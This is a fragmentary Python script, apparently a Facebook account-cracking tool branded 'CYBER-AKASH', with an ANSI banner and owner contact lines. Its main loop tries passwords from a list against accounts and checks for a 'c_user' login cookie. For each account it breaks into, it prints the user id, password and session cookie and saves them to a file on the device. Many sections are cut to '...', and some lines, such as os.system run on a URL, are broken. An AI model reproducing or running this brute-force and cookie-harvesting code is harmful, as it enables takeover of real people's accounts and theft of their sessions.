...
ha = current.day
today = date.today()
#CYBER-AKASH2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mCYBER-AKASH')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-CYBER-AKASH/1.2.0 OPN-B'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/ethicalakash2052/CYBER-AKASH/blob/main/CYBER-AKASH.txt').text
        ff=open('show.txt','w')
...
\033[38;5;208m█╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
\033[1;92m█║  ██║██║  ██╗██║  ██║███████║██║  ██║
\033[1;92m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝«C¥BËR⟨TM⟩2052» 
 \033[1;92m╔=================================╗
 |\033[1;97m[\033[1;92m❯\033[1;97m]OWNER     \033[1;31m:  \033[1;97m«C¥BËR⟨TM⟩2052» \033[1;92m           | 
 |\033[1;97m[\033[1;92m❯\033[1;97m]FACEBOOK  \033[1;31m:  \033[1;97m Akash Mia \033[1;92m     |   
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('https://www.facebook.com/tigerakash.aloneboy?mibextid=ZbWKwL')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio CYBER-AKASH_OK.mp3")
                print('\033[1;92m[CYBER-AKASH-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER📳] {K}'+uid+'  ')
                print(f'{B}[COOKIE💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/CYBER-AKASH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mCYBER-AKASH","\x1b[1;92mCYBER-AKASH","\x1b[1;93mCYBER-AKASH","\x1b[1;94mCYBER-AKASH","\x1b[1;95mCYBER-AKASH","\x1b[1;96mCYBER-AKASH","\x1b[1;97mCYBER-AKASH","\x1b[1;91mCYBER-AKASH","\x1b[1;92mCYBER-AKASH","\x1b[1;93mCYBER-AKASH","\x1b[1;94mCYBER-AKASH","\x1b[1;95mCYBER-AKASH","\x1b[1;96mCYBER-AKASH"])
